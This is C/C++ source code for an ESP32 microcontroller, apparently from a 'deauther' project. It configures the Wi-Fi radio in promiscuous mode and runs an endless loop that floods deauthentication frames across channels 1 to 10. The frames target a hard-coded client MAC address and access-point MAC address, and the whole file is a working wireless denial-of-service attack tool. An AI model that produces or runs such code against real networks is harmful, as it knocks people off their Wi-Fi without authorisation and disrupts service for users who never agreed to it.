#include  <stdio.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "./configure_wifi.h"
#include "freertos/FreeRTOS.h"

#include "esp_system.h"
#include "esp_event.h"
#include "esp_wifi.h"

#include "nvs_flash.h"

#include "configure_wifi.h"

#include "packet.hpp"

PacketSender sender;

void spam_task(void *pvParameter) {

    // 68-EC-C5-7B-F5-F8
    const MacAddr TARGET = {
        0x68, 0xec, 0xc5, 0x7b, 0xF5, 0xF8
    };
    // 9c:a2:f4:67:c1:ca
    const MacAddr AP = {
        //replace with your AP's mac address
        0x9c, 0xa2, 0xf4, 0x67, 0xc1, 0xca
    };

	while(1) {
        vTaskDelay(1000 / portTICK_PERIOD_MS);

        for(uint8_t ch = 1; ch < 11; ch++) {
            printf("Deauthing channel %d\n", ch);
            esp_err_t res;
            res = sender.deauth(TARGET, AP, AP, 1, ch);
            if(res != ESP_OK) printf("  Error: %s\n", esp_err_to_name(res));
        }
    }
}

extern "C" void app_main() {
    nvs_flash_init();
    esp_netif_init();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

    ESP_ERROR_CHECK(esp_event_loop_create_default());
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

    // Init dummy AP to specify a channel and get WiFi hardware into
    // a mode where we can send the actual fake beacon frames.
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));

    ESP_ERROR_CHECK(esp32_deauther_configure_wifi(/* channel */ 1));

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
    xTaskCreate(&spam_task, "spam_task", 2048, NULL, 5, NULL);
}